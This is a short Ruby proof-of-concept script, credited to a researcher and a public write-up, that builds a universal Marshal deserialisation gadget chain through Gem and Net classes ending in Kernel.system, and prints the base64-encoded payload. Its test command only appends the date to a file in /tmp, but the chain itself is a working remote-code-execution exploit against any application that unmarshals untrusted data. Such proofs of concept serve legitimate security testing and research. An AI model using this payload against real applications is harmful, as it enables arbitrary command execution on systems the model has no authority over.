# Original code by William Bowling, AKA vakzz
# Mostly based on https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

require "base64"

# prevent the payload from running when we Marshal.dump it
module Gem

	class Requirement
	  def marshal_dump
	    [@requirements]
	  end
	end

end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "date >> /tmp/rce9b.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")

n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump({payload: [Gem::SpecFetcher, Gem::Installer, r]})
puts Base64.strict_encode64(payload)